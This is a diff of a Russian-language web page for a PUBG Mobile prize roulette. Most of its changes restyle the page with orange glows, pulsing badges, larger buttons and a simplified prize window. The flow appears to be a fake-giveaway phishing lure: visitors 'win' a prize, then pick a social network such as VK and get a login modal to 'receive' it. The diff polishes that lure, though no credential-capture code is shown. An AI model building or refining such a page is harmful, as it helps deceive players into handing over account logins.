@@ -128,7 +128,7 @@
             margin-left: 40px;
         }
         
-        /* Иконка почты для приза */
+        /* Иконка почты для приза с анимацией */
         .prize-mail-icon {
             position: relative;
             margin-left: auto;
@@ -170,28 +170,13 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
+            animation: emojiPulse 2s infinite;
         }
         
-        /* Анимированный эмодзи для неполученного приза */
-        .prize-badge.emoji-alert {
-            background: transparent;
-            font-size: 20px;
-            width: 24px;
-            height: 24px;
-            top: -10px;
-            right: -10px;
-            animation: pulse-emoji 1.5s infinite alternate;
-        }
-        
-        @keyframes pulse-emoji {
-            0% {
-                transform: scale(1);
-                opacity: 0.8;
-            }
-            100% {
-                transform: scale(1.3);
-                opacity: 1;
-            }
+        @keyframes emojiPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
         }
         
         .prize-mail-btn:disabled {
@@ -201,7 +186,7 @@
             transform: none;
         }
         
-        /* Окно с призом */
+        /* Окно с призом - УПРОЩЕННОЕ */
         .prize-window {
             position: fixed;
             top: 0;
@@ -226,7 +211,7 @@
             border-radius: 20px;
             padding: 30px;
             width: 90%;
-            max-width: 400px;
+            max-width: 350px;
             border: 2px solid #2a3b5a;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
             text-align: center;
@@ -235,16 +220,19 @@
         
         .prize-header {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
             margin-bottom: 20px;
         }
         
         .prize-title {
-            color: #8da1b5;
-            font-size: 22px;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
+            color: #ffb000;
+            font-size: 26px;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 176, 0, 0.5);
         }
         
         .close-prize {
@@ -254,6 +242,9 @@
             font-size: 28px;
             cursor: pointer;
             transition: color 0.3s;
+            position: absolute;
+            top: 15px;
+            right: 15px;
         }
         
         .close-prize:hover {
@@ -262,85 +253,17 @@
         
         .prize-image-container {
             margin: 20px 0;
-            padding: 20px;
+            padding: 15px;
             background: rgba(10, 21, 32, 0.7);
             border-radius: 15px;
             border: 2px solid #2a3b5a;
         }
         
         .prize-image {
-            width: 150px;
-            height: 150px;
+            width: 130px;
+            height: 130px;
             object-fit: contain;
             margin: 0 auto;
-        }
-        
-        .prize-name {
-            color: #8da1b5;
-            font-size: 18px;
-            margin: 15px 0;
-            font-family: Arial, sans-serif;
-            font-weight: 500;
-        }
-        
-        .prize-status {
-            color: #8da1b5;
-            font-size: 16px;
-            margin: 15px 0;
-            font-family: Arial, sans-serif;
-            padding: 10px;
-            background: rgba(42, 59, 90, 0.5);
-            border-radius: 8px;
-        }
-        
-        .prize-status.received {
-            color: #4CAF50;
-            background: rgba(76, 175, 80, 0.1);
-            border: 1px solid #4CAF50;
-        }
-        
-        .prize-status.not-received {
-            color: #ff9800;
-            background: rgba(255, 152, 0, 0.1);
-            border: 1px solid #ff9800;
-        }
-        
-        .get-prize-now-btn {
-            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
-            color: #8da1b5;
-            border: none;
-            border-radius: 60px;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: 500;
-            cursor: pointer;
-            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
-            transition: all 0.3s;
-            width: 100%;
-            font-family: Arial, sans-serif;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-top: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            backdrop-filter: blur(5px);
-            border: 2px solid rgba(42, 59, 90, 0.5);
-        }
-        
-        .get-prize-now-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
-            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
-        }
-        
-        .get-prize-now-btn:disabled {
-            background: linear-gradient(45deg, #444, #555);
-            color: #777;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .no-prize-message {
@@ -385,123 +308,318 @@
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ - УМЕНЬШЕННЫЙ */
         .roulette-container {
             position: relative;
             width: 100%;
-            height: 450px;
-            background: rgba(20, 35, 60, 0.7);
+            height: 380px;
+            background: rgba(20, 35, 60, 0.3);
             border-radius: 20px;
             overflow: hidden;
-            margin-bottom: 30px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
-            border: 3px solid #2a3b5a;
-            backdrop-filter: blur(5px);
+            margin-bottom: 25px;
+            box-shadow: 
+                0 15px 30px rgba(0, 0, 0, 0.6),
+                inset 0 0 60px rgba(42, 59, 90, 0.3);
+            border: 3px solid rgba(42, 59, 90, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
+        /* УМЕНЬШЕННАЯ СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             grid-template-rows: repeat(3, 1fr);
-            gap: 15px;
-            width: 90%;
-            height: 90%;
+            gap: 8px;
+            width: 85%;
+            height: 85%;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            padding: 20px;
+            padding: 15px;
         }
         
         .prize-item {
-            background: transparent;
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 0;
-            transition: all 0.3s;
-            border: none;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid transparent;
             position: relative;
+            overflow: hidden;
+        }
+        
+        .prize-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(42, 59, 90, 0.3), transparent);
+            border-radius: 11px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255, 176, 0, 0.3);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-item:hover::before {
+            opacity: 1;
         }
         
         .prize-item img {
-            width: 90px;
-            height: 90px;
+            width: 70px;
+            height: 70px;
             object-fit: contain;
-            transition: all 0.3s;
+            transition: all 0.4s;
+            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
+            z-index: 1;
         }
         
         .prize-item:hover img {
-            transform: scale(1.1);
+            transform: scale(1.1) rotate(5deg);
         }
         
         .center-item {
             grid-column: 2;
             grid-row: 2;
+            background: none;
+            border: none;
         }
         
+        .center-item img {
+            width: 60px;
+            height: 60px;
+            filter: drop-shadow(0 0 10px rgba(255, 176, 0, 0.5));
+            opacity: 0.8;
+        }
+        
+        /* УМЕНЬШЕННАЯ РАМКА ВЫБОРА */
         .selection-frame {
             position: absolute;
-            border: 4px solid #2a3b5a;
-            border-radius: 12px;
-            box-shadow: 0 0 25px #2a3b5a, 
-                        0 0 35px rgba(42, 59, 90, 0.7),
-                        inset 0 0 20px rgba(42, 59, 90, 0.4);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 10;
+            border: 2px solid #ffb000;
+            border-radius: 15px;
+            box-shadow: 
+                0 0 20px rgba(255, 176, 0, 0.8),
+                0 0 40px rgba(255, 176, 0, 0.4),
+                inset 0 0 20px rgba(255, 176, 0, 0.2);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100;
             pointer-events: none;
             opacity: 0;
-            background: rgba(42, 59, 90, 0.2);
-            backdrop-filter: blur(3px);
+            background: rgba(255, 176, 0, 0.15);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .selection-frame::before {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            right: -6px;
+            bottom: -6px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 18px;
+            animation: borderRotate 4s linear infinite;
+            pointer-events: none;
+        }
+        
+        .selection-frame::after {
+            content: '';
+            position: absolute;
+            top: 6px;
+            left: 6px;
+            right: 6px;
+            bottom: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            pointer-events: none;
+        }
+        
+        /* Уголки рамки - УМЕНЬШЕННЫЕ */
+        .corner {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #ffb000;
+            opacity: 0.8;
+        }
+        
+        .corner-tl {
+            top: -4px;
+            left: -4px;
+            border-right: none;
+            border-bottom: none;
+            border-top-left-radius: 6px;
+        }
+        
+        .corner-tr {
+            top: -4px;
+            right: -4px;
+            border-left: none;
+            border-bottom: none;
+            border-top-right-radius: 6px;
+        }
+        
+        .corner-bl {
+            bottom: -4px;
+            left: -4px;
+            border-right: none;
+            border-top: none;
+            border-bottom-left-radius: 6px;
+        }
+        
+        .corner-br {
+            bottom: -4px;
+            right: -4px;
+            border-left: none;
+            border-top: none;
+            border-bottom-right-radius: 6px;
         }
         
         .selection-frame.active {
             opacity: 1;
-            animation: pulse 1.5s infinite alternate;
+            animation: 
+                pulse 1.2s infinite alternate,
+                glow 2s infinite alternate;
+        }
+        
+        @keyframes borderRotate {
+            0% { border-color: rgba(255, 255, 255, 0.3); }
+            25% { border-color: rgba(255, 176, 0, 0.5); }
+            50% { border-color: rgba(255, 255, 255, 0.3); }
+            75% { border-color: rgba(255, 176, 0, 0.5); }
+            100% { border-color: rgba(255, 255, 255, 0.3); }
         }
         
         @keyframes pulse {
-            from {
-                box-shadow: 0 0 25px #2a3b5a, 
-                            0 0 35px rgba(42, 59, 90, 0.7),
-                            inset 0 0 20px rgba(42, 59, 90, 0.4);
+            0% {
+                transform: scale(1);
+                box-shadow: 
+                    0 0 20px rgba(255, 176, 0, 0.8),
+                    0 0 40px rgba(255, 176, 0, 0.4),
+                    inset 0 0 20px rgba(255, 176, 0, 0.2);
             }
-            to {
-                box-shadow: 0 0 30px #3a4b6a, 
-                            0 0 45px rgba(58, 75, 106, 0.8),
-                            inset 0 0 25px rgba(42, 59, 90, 0.5);
+            100% {
+                transform: scale(1.03);
+                box-shadow: 
+                    0 0 30px rgba(255, 176, 0, 1),
+                    0 0 60px rgba(255, 176, 0, 0.6),
+                    inset 0 0 30px rgba(255, 176, 0, 0.3);
             }
         }
         
+        @keyframes glow {
+            0% {
+                background: rgba(255, 176, 0, 0.15);
+            }
+            100% {
+                background: rgba(255, 176, 0, 0.25);
+            }
+        }
+        
+        /* ИНДИКАТОР ВЫБОРА - УМЕНЬШЕННЫЙ */
+        .selection-indicator {
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ffb000, #ff8000);
+            color: #000;
+            padding: 6px 15px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 12px;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(255, 128, 0, 0.4);
+            z-index: 101;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .selection-indicator::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-top: 8px solid #ffb000;
+        }
+        
+        .selection-indicator.show {
+            opacity: 1;
+        }
+        
+        /* КНОПКА ИГРАТЬ */
         .play-btn {
-            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
-            color: #8da1b5;
+            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
+            color: #000;
             border: none;
             border-radius: 60px;
-            padding: 22px 50px;
-            font-size: 24px;
-            font-weight: 500;
+            padding: 20px 45px;
+            font-size: 22px;
+            font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
-            transition: all 0.3s;
-            margin-bottom: 35px;
+            box-shadow: 
+                0 8px 25px rgba(255, 128, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-bottom: 30px;
             width: 85%;
             max-width: 350px;
-            font-family: Arial, sans-serif;
-            letter-spacing: 1px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px;
             text-transform: uppercase;
-            backdrop-filter: blur(5px);
-            border: 2px solid rgba(42, 59, 90, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .play-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
         }
         
         .play-btn:hover:not(:disabled) {
-            transform: translateY(-5px) scale(1.05);
-            box-shadow: 0 15px 35px rgba(42, 59, 90, 0.7);
-            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 
+                0 15px 35px rgba(255, 128, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            letter-spacing: 3px;
+        }
+        
+        .play-btn:hover::before {
+            left: 100%;
         }
         
         .play-btn:active:not(:disabled) {
-            transform: translateY(2px) scale(0.98);
+            transform: translateY(-2px) scale(0.98);
         }
         
         .play-btn:disabled {
@@ -512,7 +630,12 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Форма выбора соцсети */
+        .play-btn i {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        /* ФОРМА ВЫБОРА СОЦСЕТИ */
         .social-select-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -521,124 +644,194 @@
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(42, 59, 90, 0.4);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 176, 0, 0.3);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             backdrop-filter: blur(10px);
+            transition: all 0.6s ease;
         }
         
         .social-select-section.active {
             display: block;
-            animation: fadeInUp 0.6s ease;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
-        @keyframes fadeInUp {
+        @keyframes slideInUp {
             from { 
                 opacity: 0; 
-                transform: translateY(30px); 
+                transform: translateY(30px) scale(0.95); 
             }
             to { 
                 opacity: 1; 
-                transform: translateY(0); 
+                transform: translateY(0) scale(1); 
             }
         }
         
         .social-select-section h2 {
-            color: #8da1b5;
+            color: #ffb000;
             text-align: center;
             margin-bottom: 20px;
-            font-size: 22px;
-            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-family: 'Orbitron', sans-serif;
             font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .social-select-section p {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
         }
         
         .social-grid {
-            display: flex;
-            justify-content: center;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
-            flex-wrap: wrap;
         }
         
         .social-option {
             background: rgba(12, 26, 45, 0.7);
-            border-radius: 12px;
-            padding: 15px;
+            border-radius: 15px;
+            padding: 20px 15px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             border: 2px solid transparent;
-            width: 120px;
-            backdrop-filter: blur(5px);
-        }
-        
-        .social-option:hover {
-            transform: translateY(-3px);
-            border-color: #2a3b5a;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            background: rgba(42, 59, 90, 0.5);
-        }
-        
-        .social-option.selected {
-            border-color: #2a3b5a;
-            background: rgba(42, 59, 90, 0.7);
-            box-shadow: 0 0 15px rgba(42, 59, 90, 0.5);
-        }
-        
-        .social-icon {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 8px;
+            position: relative;
             overflow: hidden;
         }
         
-        .social-icon img {
+        .social-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(255, 176, 0, 0.1), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .social-option:hover {
+            transform: translateY(-5px) scale(1.05);
+            border-color: rgba(255, 176, 0, 0.5);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .social-option:hover::before {
+            opacity: 1;
+        }
+        
+        .social-option.selected {
+            border-color: #ffb000;
+            background: rgba(255, 176, 0, 0.1);
+            box-shadow: 
+                0 0 20px rgba(255, 176, 0, 0.4),
+                inset 0 0 10px rgba(255, 176, 0, 0.1);
+            transform: scale(1.05);
+        }
+        
+        .social-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            overflow: hidden;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            transition: all 0.3s;
+        }
+        
+        .social-icon img, .social-icon svg {
             width: 100%;
             height: 100%;
             object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
+        }
+        
+        .social-option.selected .social-icon {
+            background: rgba(255, 176, 0, 0.2);
+            transform: scale(1.1);
         }
         
         .social-option span {
-            font-weight: 500;
+            font-weight: 600;
             font-size: 14px;
             color: #8da1b5;
             font-family: Arial, sans-serif;
+            transition: color 0.3s;
         }
         
+        .social-option.selected span {
+            color: #ffb000;
+            font-weight: 700;
+        }
+        
+        /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
-            color: #8da1b5;
+            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
+            color: #000;
             border: none;
             border-radius: 60px;
-            padding: 18px 30px;
+            padding: 20px 40px;
             font-size: 20px;
-            font-weight: 500;
+            font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
-            transition: all 0.3s;
+            box-shadow: 
+                0 10px 30px rgba(255, 128, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
-            font-family: Arial, sans-serif;
-            letter-spacing: 1px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1.5px;
             text-transform: uppercase;
             margin-top: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            backdrop-filter: blur(5px);
-            border: 2px solid rgba(42, 59, 90, 0.5);
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .get-prize-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
         }
         
         .get-prize-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
-            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
+            transform: translateY(-5px);
+            box-shadow: 
+                0 15px 35px rgba(255, 128, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            letter-spacing: 2px;
+        }
+        
+        .get-prize-btn:hover::before {
+            left: 100%;
         }
         
         .get-prize-btn:disabled {
@@ -649,30 +842,52 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Секция подтверждения получения приза */
+        .get-prize-btn i {
+            font-size: 20px;
+        }
+        
+        /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
         .confirmation-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
-            padding: 30px 25px;
+            padding: 40px 30px;
             width: 100%;
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(42, 59, 90, 0.4);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(76, 175, 80, 0.3);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             text-align: center;
             backdrop-filter: blur(10px);
         }
         
         .confirmation-section.active {
             display: block;
-            animation: fadeInUp 0.6s ease;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .confirmation-icon {
-            font-size: 60px;
-            color: #8da1b5;
+            font-size: 80px;
+            color: #4CAF50;
             margin-bottom: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+        
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+        
+        .confirmation-section h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+            font-size: 28px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
         
         .confirmation-message {
@@ -681,9 +896,58 @@
             line-height: 1.6;
             margin-bottom: 25px;
             font-family: Arial, sans-serif;
+            padding: 20px;
+            background: rgba(76, 175, 80, 0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(76, 175, 80, 0.3);
         }
         
-        /* Модальные окна для входа */
+        /* УВЕДОМЛЕНИЯ */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #2a3b5a, #1a2c42);
+            color: #ffb000;
+            padding: 20px 30px;
+            border-radius: 15px;
+            border-left: 5px solid #ffb000;
+            box-shadow: 
+                0 10px 25px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            display: none;
+            z-index: 1001;
+            max-width: 350px;
+            animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-family: Arial, sans-serif;
+            backdrop-filter: blur(10px);
+            font-weight: 500;
+        }
+        
+        .notification.error {
+            color: #ff4444;
+            border-left-color: #ff4444;
+            background: linear-gradient(135deg, #5a1a1a, #3a0a0a);
+        }
+        
+        .notification.success {
+            color: #4CAF50;
+            border-left-color: #4CAF50;
+            background: linear-gradient(135deg, #1a5a1a, #0a3a0a);
+        }
+        
+        @keyframes slideInRight {
+            from { 
+                transform: translateX(100%) scale(0.8); 
+                opacity: 0; 
+            }
+            to { 
+                transform: translateX(0) scale(1); 
+                opacity: 1; 
+            }
+        }
+        
+        /* ОСТАЛЬНЫЕ СТИЛИ (остаются без изменений) */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1554,7 +1818,7 @@
         }
         
         .footer-link:hover {
-            color: #2a3b5a;
+            color: #ffb000;
         }
         
         .copyright {
@@ -1566,43 +1830,29 @@
             font-family: Arial, sans-serif;
         }
         
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #2a3b5a;
-            color: #8da1b5;
-            padding: 15px 25px;
-            border-radius: 10px;
-            border-left: 5px solid #2a3b5a;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            display: none;
-            z-index: 1001;
-            max-width: 300px;
-            animation: slideIn 0.5s ease;
-            font-family: Arial, sans-serif;
-            backdrop-filter: blur(5px);
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
         @media (max-width: 600px) {
+            .roulette-container {
+                height: 320px;
+            }
+            
             .prizes-grid {
-                gap: 10px;
-                padding: 15px;
+                gap: 6px;
+                padding: 12px;
             }
             
             .prize-item img {
-                width: 70px;
-                height: 70px;
+                width: 55px;
+                height: 55px;
+            }
+            
+            .center-item img {
+                width: 50px;
+                height: 50px;
             }
             
             .play-btn {
-                padding: 18px 30px;
-                font-size: 20px;
+                padding: 16px 35px;
+                font-size: 18px;
             }
             
             .header h1 {
@@ -1614,17 +1864,17 @@
             }
             
             .social-grid {
+                grid-template-columns: repeat(2, 1fr);
                 gap: 10px;
             }
             
             .social-option {
-                width: 100px;
-                padding: 12px;
+                padding: 15px 10px;
             }
             
             .social-icon {
-                width: 40px;
-                height: 40px;
+                width: 50px;
+                height: 50px;
             }
             
             .logo {
@@ -1665,10 +1915,24 @@
                 font-size: 10px;
             }
             
-            .prize-badge.emoji-alert {
-                width: 22px;
-                height: 22px;
-                font-size: 18px;
+            .selection-indicator {
+                font-size: 11px;
+                padding: 5px 12px;
+                top: -25px;
+            }
+            
+            .prize-content {
+                padding: 25px;
+                max-width: 320px;
+            }
+            
+            .prize-image {
+                width: 110px;
+                height: 110px;
+            }
+            
+            .prize-title {
+                font-size: 22px;
             }
         }
     </style>
@@ -1678,12 +1942,12 @@
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
     
-    <!-- Окно с призом -->
+    <!-- Окно с призом - УПРОЩЕННОЕ -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
+            <button class="close-prize" onclick="closePrizeWindow()">&times;</button>
             <div class="prize-header">
-                <h2 class="prize-title">ВАШ ПРИЗ</h2>
-                <button class="close-prize" onclick="closePrizeWindow()">&times;</button>
+                <h2 class="prize-title">❗️ ВАШ ПРИЗ ❗️</h2>
             </div>
             
             <div id="prizeWindowContent">
@@ -1957,35 +2221,42 @@
         <div class="roulette-container">
             <div class="prizes-grid">
                 <div class="prize-item" data-id="1">
-                    <img src="priz1.png" alt="Приз 1">
+                    <img src="priz1.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="2">
-                    <img src="priz2.png" alt="Приз 2">
+                    <img src="priz2.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="3">
-                    <img src="priz3.png" alt="Приз 3">
+                    <img src="priz3.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="4">
-                    <img src="priz4.png" alt="Приз 4">
+                    <img src="priz4.png" alt="Приз">
                 </div>
                 <div class="prize-item center-item" data-id="5">
-                    <img src="priz5.png" alt="Приз 5">
+                    <img src="priz5.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="6">
-                    <img src="priz6.png" alt="Приз 6">
+                    <img src="priz6.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="7">
-                    <img src="priz7.png" alt="Приз 7">
+                    <img src="priz7.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="8">
-                    <img src="priz8.png" alt="Приз 8">
+                    <img src="priz8.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="9">
-                    <img src="priz9.png" alt="Приз 9">
+                    <img src="priz9.png" alt="Приз">
                 </div>
             </div>
             
-            <div class="selection-frame" id="selectionFrame"></div>
+            <!-- Уменьшенная рамка с индикатором -->
+            <div class="selection-frame" id="selectionFrame">
+                <div class="corner corner-tl"></div>
+                <div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div>
+                <div class="corner corner-br"></div>
+            </div>
+            <div class="selection-indicator" id="selectionIndicator">ВЫБРАНО</div>
         </div>
         
         <button class="play-btn" id="playBtn">
@@ -1995,7 +2266,7 @@
         <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
             <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
-            <p style="text-align: center; margin-bottom: 20px; color: #8da1b5; font-family: Arial, sans-serif;">Выберите социальную сеть для получения приза</p>
+            <p>Выберите социальную сеть для получения приза</p>
             
             <div class="social-grid">
                 <div class="social-option" data-social="vk" onclick="openModal('vkModal')">
@@ -2043,7 +2314,7 @@
             <div class="confirmation-icon">
                 <i class="fas fa-check-circle"></i>
             </div>
-            <h2 style="color: #8da1b5; margin-bottom: 20px; font-family: Arial, sans-serif;">ЗАЯВКА ПРИНЯТА!</h2>
+            <h2>ЗАЯВКА ПРИНЯТА!</h2>
             
             <div class="confirmation-message">
                 Ваш выигрыш будет зачислен на аккаунт PUBG Mobile<br>
@@ -2128,19 +2399,16 @@
             if (userPrize) {
                 content.innerHTML = `
                     <div class="prize-image-container">
-                        <img src="${userPrize.image}" alt="Ваш приз" class="prize-image">
-                    </div>
-                    <div class="prize-status ${isPrizeReceived ? 'received' : 'not-received'}">
-                        ${isPrizeReceived ? '✅ Приз уже получен' : '⏳ Ожидает получения'}
+                        <img src="${userPrize.image}" alt="Приз" class="prize-image">
                     </div>
                     ${!isPrizeReceived ? `
-                    <button class="get-prize-now-btn" onclick="getPrizeFromWindow()">
+                    <button class="get-prize-now-btn" onclick="getPrizeFromWindow()" style="background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%); color: #000; border: none; border-radius: 60px; padding: 15px 30px; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; font-family: 'Orbitron', sans-serif; margin-top: 20px;">
                         <i class="fas fa-gift"></i> ПОЛУЧИТЬ СЕЙЧАС
                     </button>
                     ` : ''}
                     <p style="color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;">
                         ${isPrizeReceived ? 
